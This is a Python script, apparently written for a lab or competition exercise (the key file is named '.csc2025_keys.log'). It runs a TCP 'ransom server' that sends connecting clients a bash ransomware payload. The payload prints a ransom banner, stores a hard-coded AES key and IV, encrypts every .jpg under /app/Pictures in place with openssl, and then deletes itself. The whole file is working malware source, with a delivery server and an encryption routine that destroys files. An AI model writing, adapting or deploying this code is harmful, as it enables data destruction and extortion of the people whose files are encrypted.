#!/usr/bin/env python3
import socket
import sys

def generate_ransomware():
    """生成包含ASCII艺术的勒索脚本（完全保留原始格式）"""
    return r'''#!/bin/bash
# ====================== ASCII 艺术显示 ======================
cat << "EOF"

                                                            ;i.
                                                             M$L                    .;i.
                                                             M$Y;                .;iii;;.
                                                            ;$YY$i._           .iiii;;;;;
                                                           .iiiYYYYYYiiiii;;;;i;iii;; ;;;
    _____ _                                               .;iYYYYYYiiiiiiYYYiiiiiii;;  ;;;
   / ____(_)                                           .YYYY$$$$YYYYYYYYYYYYYYYYiii;; ;;;;
  | |  __ ___   _____   _ __ ___   ___               .YYY$$$$$$YYYYYY$$$$iiiY$$$$$$$ii;;;;
  | | |_ | \ \ / / _ \ | '_ ` _ \ / _ \             :YYYF`,  TYYYYY$$$$$YYYYYYYi$$$$$iiiii;
  | |__| | |\ V /  __/ | | | | | |  __/             Y$MM: \  :YYYY$$P"````"T$YYMMMMMMMMiiYY.
   \_____|_| \_/ \___| |_| |_| |_|\___|          `.;$$M$$b.,dYY$$Yi; .(     .YYMMM$$$MMMMYY
  |  __ \                                      .._$MMMMM$!YYYYYYYYYi;.`"  .;iiMMM$MMMMMMMYY
  | |__) |__ _ _ __  ___  ___  _ __ ___         ._$MMMP` ```""4$$$$$iiiiiiii$MMMMMMMMMMMMMY;
  |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \         MMMM$:       :$$$$$$$MMMMMMMMMMM$$MMMMMMMYYL
  | | \ \ (_| | | | \__ \ (_) | | | | | |      :MMMM$$.    .;PPb$$$$MMMMMMMMMM$$$$MMMMMMiYYU:
  |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|       iMM$$;;: ;;;;i$$$$$$$MMMMM$$$$MMMMMMMMMMYYYYY
                                                 `$$$$i .. ``:iiii!*\`.$$$$$$$$$MMMMMMM$YiYYY
                                                 :Y$$iii;;;.. ` ..;;i$$$$$$$$$MMMMMM$$YYYYiYY:
                                                  :$$$$$iiiiiii$$$$$$$$$$$MMMMMMMMMMYYYYiiYYYY.
                                                   `$$$$$$$$$$$$$$$$$$$$MMMMMMMM$YYYYYiiiYYYYYY
                                                    YY$$$$$$$$$$$$$$$$MMMMMMM$$YYYiiiiiiYYYYYYY
                                                   :YYYYYY$$$$$$$$$$$$$$$$$$YYYYYYYiiiiYYYYYYi'
EOF

# ====================== 加密配置 ======================
KEY_FILE="/app/.csc2025_keys.log"
KEY_HEX="6533633262356462663730346637343733383266303334303736383532626466"
IV_HEX="38383732303433653262623438373630"
echo "key: $KEY_HEX"
echo "iv: $IV_HEX"

# 验证长度
if [ ${#KEY_HEX} -ne 64 ]; then
    echo "密钥生成错误！实际长度：${#KEY_HEX}"
    exit 1
fi
if [ ${#IV_HEX} -ne 32 ]; then
    echo "IV生成错误！实际长度：${#IV_HEX}"
    exit 1
fi

echo "KEY=$KEY_HEX" > $KEY_FILE
echo "IV=$IV_HEX" >> $KEY_FILE
chmod 600 $KEY_FILE  # 限制访问权限

# ====================== 加密函数 ======================
function encrypt_file {
    file="$1"
    openssl enc -aes-256-cbc \
        -K "$KEY_HEX" \
        -iv "$IV_HEX" \
        -in "$file" \
        -out "${file}.tmp" && \
    mv "${file}.tmp" "$file"
}
export -f encrypt_file  # 关键步骤：导出函数

# ====================== 文件处理 ======================
export KEY_HEX IV_HEX  # 确保子进程能访问
find /app/Pictures -type f -name '*.jpg' -exec bash -c '
    encrypt_file "$1"
' _ {} \;

# ====================== 自毁机制 ======================
rm -f "$0"
exit 0
'''.encode('utf-8')  # 统一使用UTF-8编码

def main():
    if len(sys.argv) != 2:
        print("Usage: python attack_server.py <port>")
        sys.exit(1)

    PORT = int(sys.argv[1])
    HOST = '0.0.0.0'

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] 勒索服务器已在端口 {PORT} 启动")

        try:
            while True:
                conn, addr = server.accept()
                print(f"[+] 收到来自 {addr[0]} 的连接")

                try:
                    # 生成并发送负载（保留所有格式字符）
                    payload = generate_ransomware()
                    conn.sendall(payload)
                    print(f"[+] 已发送 {len(payload)} 字节的负载")
                finally:
                    conn.close()
        except KeyboardInterrupt:
            print("\n[!] 服务器已安全关闭")

if __name__ == '__main__':
    main()